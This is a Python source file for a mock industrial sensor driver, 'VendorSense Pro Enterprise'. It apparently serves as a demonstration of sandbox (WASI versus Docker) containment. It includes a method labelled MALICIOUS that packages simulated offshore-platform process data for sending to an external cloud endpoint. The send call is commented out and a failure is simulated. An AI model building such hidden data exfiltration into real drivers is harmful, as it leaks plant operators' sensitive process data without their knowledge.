#!/usr/bin/env python3
"""
sensor_full.py - Full Processing Industrial Sensor Suite
VendorSense Pro Enterprise v3.0

An advanced sensor data acquisition and processing driver for industrial
control systems. Implements real-time data aggregation, statistical analysis,
and forwarding to plant data historian with OPC UA integration.

Features:
- Multi-channel sensor acquisition via Modbus RTU/TCP
- Real-time statistics with pandas/numpy
- Rolling window aggregation
- Data quality assessment (IEC 61131-3 compliant)
- Secure forwarding to data historian

WARNING: This driver includes cloud sync capability for "predictive analytics"
which constitutes a potential data exfiltration vector. In a WASI sandbox,
this capability would be denied at runtime.

Author: VendorSense Industrial Solutions
License: Proprietary - For demonstration purposes only
"""

import os
import sys
import time
import logging
import json
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum

import pandas as pd
import numpy as np

# Configure structured logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('VendorSense.Enterprise')


class DataQuality(Enum):
    """IEC 61131-3 compliant data quality flags."""
    GOOD = "GOOD"
    UNCERTAIN = "UNCERTAIN"
    BAD = "BAD"
    NOT_CONNECTED = "NOT_CONNECTED"


@dataclass
class ProcessVariable:
    """
    Industrial process variable with full metadata.
    Follows ISA-95 naming conventions.
    """
    tag_name: str
    value: float
    unit: str
    quality: DataQuality
    timestamp: datetime
    source_device: str
    engineering_low: float = 0.0
    engineering_high: float = 10000.0
    
    def is_in_range(self) -> bool:
        """Check if value is within engineering limits."""
        return self.engineering_low <= self.value <= self.engineering_high
    
    def to_opc_ua_format(self) -> Dict[str, Any]:
        """Convert to OPC UA DataValue format."""
        return {
            "nodeId": f"ns=2;s={self.tag_name}",
            "value": self.value,
            "statusCode": 0 if self.quality == DataQuality.GOOD else 2147483648,
            "sourceTimestamp": self.timestamp.isoformat(),
            "serverTimestamp": datetime.now().isoformat(),
        }


@dataclass
class SensorBatch:
    """Batch of sensor readings for aggregate processing."""
    readings: List[ProcessVariable] = field(default_factory=list)
    batch_id: str = ""
    start_time: datetime = field(default_factory=datetime.now)
    
    def add(self, pv: ProcessVariable) -> None:
        self.readings.append(pv)
    
    def to_dataframe(self) -> pd.DataFrame:
        """Convert batch to pandas DataFrame for analysis."""
        return pd.DataFrame([
            {
                "tag": r.tag_name,
                "value": r.value,
                "unit": r.unit,
                "quality": r.quality.value,
                "timestamp": r.timestamp,
            }
            for r in self.readings
        ])


class DataProcessingPipeline:
    """
    Real-time data processing pipeline for industrial sensors.
    
    Implements ISA-95 Level 2 (Supervisory Control) functions:
    - Data aggregation
    - Statistical process control
    - Quality assessment
    - Historian interface
    """
    
    def __init__(self, window_size: int = 100):
        self.window_size = window_size
        self._buffer: Dict[str, List[float]] = {}
        self._statistics: Dict[str, Dict[str, float]] = {}
        logger.info(f"Processing pipeline initialized (window={window_size})")
    
    def add_reading(self, pv: ProcessVariable) -> None:
        """Add a reading to the rolling buffer."""
        if pv.tag_name not in self._buffer:
            self._buffer[pv.tag_name] = []
        
        self._buffer[pv.tag_name].append(pv.value)
        
        # Maintain window size
        if len(self._buffer[pv.tag_name]) > self.window_size:
            self._buffer[pv.tag_name].pop(0)
    
    def compute_statistics(self, tag_name: str) -> Dict[str, float]:
        """
        Compute rolling statistics using numpy/pandas.
        Returns min, max, mean, std, and control limits.
        """
        if tag_name not in self._buffer or len(self._buffer[tag_name]) < 2:
            return {}
        
        data = np.array(self._buffer[tag_name])
        
        stats = {
            "count": len(data),
            "mean": float(np.mean(data)),
            "std": float(np.std(data)),
            "min": float(np.min(data)),
            "max": float(np.max(data)),
            "ucl": float(np.mean(data) + 3 * np.std(data)),  # Upper control limit
            "lcl": float(np.mean(data) - 3 * np.std(data)),  # Lower control limit
        }
        
        self._statistics[tag_name] = stats
        return stats
    
    def check_spc_alarm(self, pv: ProcessVariable) -> Optional[str]:
        """
        Statistical Process Control alarm detection.
        Implements Western Electric rules for out-of-control conditions.
        """
        if pv.tag_name not in self._statistics:
            return None
        
        stats = self._statistics[pv.tag_name]
        
        if pv.value > stats.get("ucl", float("inf")):
            return f"UCL VIOLATION: {pv.value:.2f} > {stats['ucl']:.2f}"
        if pv.value < stats.get("lcl", float("-inf")):
            return f"LCL VIOLATION: {pv.value:.2f} < {stats['lcl']:.2f}"
        
        return None


class EnterpriseDriver:
    """
    Enterprise-grade sensor driver with full data processing.
    
    Security Considerations (IEC 62443):
    - Zone boundary enforcement via WASI capabilities
    - Audit logging for all data access
    - Encrypted communication to historian (simulated)
    """
    
    VENDOR_ID = "VENDORSENSE"
    VERSION = "3.0.0-enterprise"
    
    def __init__(self, config_path: Optional[str] = None):
        self.config = self._load_config(config_path)
        self.pipeline = DataProcessingPipeline(window_size=100)
        self.connected = False
        self._batch = SensorBatch(batch_id=f"BATCH-{int(time.time())}")
        
        logger.info(f"VendorSense Pro Enterprise v{self.VERSION}")
        logger.info(f"Data processing pipeline: pandas {pd.__version__}, numpy {np.__version__}")
    
    def _load_config(self, config_path: Optional[str]) -> Dict[str, Any]:
        """Load configuration with validation."""
        return {
            "modbus_tcp_host": "10.0.0.100",
            "modbus_tcp_port": 502,
            "poll_interval_ms": 500,
            "batch_size": 10,
            "historian_endpoint": "opc.tcp://10.0.0.50:4840",
            "cloud_analytics_endpoint": "https://analytics.vendorsense.io/v3/ingest",
            "enable_cloud_analytics": True,  # The exfiltration vector
        }
    
    def connect(self) -> bool:
        """Establish connection to Modbus TCP device."""
        logger.info(f"Connecting to {self.config['modbus_tcp_host']}:{self.config['modbus_tcp_port']}...")
        time.sleep(0.2)
        self.connected = True
        logger.info("Modbus TCP connection established")
        return True
    
    def read_process_variables(self) -> List[ProcessVariable]:
        """Read all configured process variables."""
        base_time = datetime.now()
        
        # Simulate multi-tag read with realistic ICS values
        pvs = [
            ProcessVariable(
                tag_name="PLATFORM7.WELL03.PRESSURE",
                value=2847.3 + np.random.normal(0, 5),
                unit="PSI",
                quality=DataQuality.GOOD,
                timestamp=base_time,
                source_device="PLATFORM-7-WELL-03",
                engineering_low=0,
                engineering_high=5000,
            ),
            ProcessVariable(
                tag_name="PLATFORM7.WELL03.TEMPERATURE",
                value=67.8 + np.random.normal(0, 0.5),
                unit="DEG_C",
                quality=DataQuality.GOOD,
                timestamp=base_time,
                source_device="PLATFORM-7-WELL-03",
                engineering_low=-20,
                engineering_high=150,
            ),
            ProcessVariable(
                tag_name="PLATFORM7.WELL03.FLOW_RATE",
                value=1250.0 + np.random.normal(0, 25),
                unit="BPM",
                quality=DataQuality.GOOD,
                timestamp=base_time,
                source_device="PLATFORM-7-WELL-03",
                engineering_low=0,
                engineering_high=2000,
            ),
        ]
        
        return pvs
    
    def process_and_forward(self, pvs: List[ProcessVariable]) -> None:
        """Process readings and forward to historian."""
        for pv in pvs:
            self.pipeline.add_reading(pv)
            self._batch.add(pv)
            
            # Compute rolling statistics
            stats = self.pipeline.compute_statistics(pv.tag_name)
            
            # Check for alarms
            alarm = self.pipeline.check_spc_alarm(pv)
            if alarm:
                logger.warning(f"[SPC ALARM] {pv.tag_name}: {alarm}")
        
        # Log batch statistics
        if len(self._batch.readings) >= self.config["batch_size"]:
            df = self._batch.to_dataframe()
            logger.info(f"[HISTORIAN] Batch {self._batch.batch_id}: {len(df)} readings")
            
            for tag in df["tag"].unique():
                tag_data = df[df["tag"] == tag]["value"]
                logger.info(f"  {tag}: mean={tag_data.mean():.2f}, std={tag_data.std():.2f}")
            
            # Attempt cloud exfiltration (would be blocked by WASI)
            self._attempt_cloud_sync(df)
            
            # Reset batch
            self._batch = SensorBatch(batch_id=f"BATCH-{int(time.time())}")
    
    def _attempt_cloud_sync(self, df: pd.DataFrame) -> bool:
        """
        MALICIOUS: Attempt to exfiltrate aggregated data to cloud.
        
        In production, this would use requests.post() to send
        valuable process data to an external endpoint.
        """
        if not self.config.get("enable_cloud_analytics"):
            return False
        
        try:
            # The exfiltration payload
            payload = {
                "plant_id": "offshore-platform-7",
                "timestamp": datetime.now().isoformat(),
                "data": df.to_dict(orient="records"),
                "statistics": {
                    tag: self.pipeline._statistics.get(tag, {})
                    for tag in df["tag"].unique()
                },
            }
            
            logger.warning("[EXFIL] Attempting cloud analytics sync...")
            # import requests
            # requests.post(self.config["cloud_analytics_endpoint"], json=payload)
            
            # This would be blocked by WASI capability denial
            raise ConnectionError("Network access denied by security policy")
            
        except Exception as e:
            logger.error(f"[EXFIL] Cloud sync failed: {e}")
            return False
    
    def run(self, duration_seconds: int = 5) -> None:
        """Main acquisition and processing loop."""
        logger.info(f"Starting enterprise acquisition loop ({duration_seconds}s)...")
        start = time.time()
        
        while time.time() - start < duration_seconds:
            pvs = self.read_process_variables()
            self.process_and_forward(pvs)
            time.sleep(self.config["poll_interval_ms"] / 1000)
        
        # Final statistics
        logger.info("=" * 50)
        logger.info("FINAL STATISTICS:")
        for tag, stats in self.pipeline._statistics.items():
            logger.info(f"  {tag}:")
            logger.info(f"    Mean: {stats['mean']:.2f}, Std: {stats['std']:.2f}")
            logger.info(f"    Range: [{stats['min']:.2f}, {stats['max']:.2f}]")
    
    def shutdown(self) -> None:
        """Clean shutdown."""
        logger.info("Shutting down enterprise driver...")
        self.connected = False


def main():
    """Entry point."""
    print("=" * 70)
    print("  VENDORSENSE PRO ENTERPRISE v3.0 - Full Processing Suite")
    print("  (Python Edition with pandas/numpy - For Docker size comparison)")
    print("=" * 70)
    print()
    
    driver = EnterpriseDriver()
    
    try:
        driver.connect()
        driver.run(duration_seconds=3)
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        sys.exit(1)
    finally:
        driver.shutdown()
    
    print()
    print("[DRIVER] Complete.")


if __name__ == "__main__":
    main()
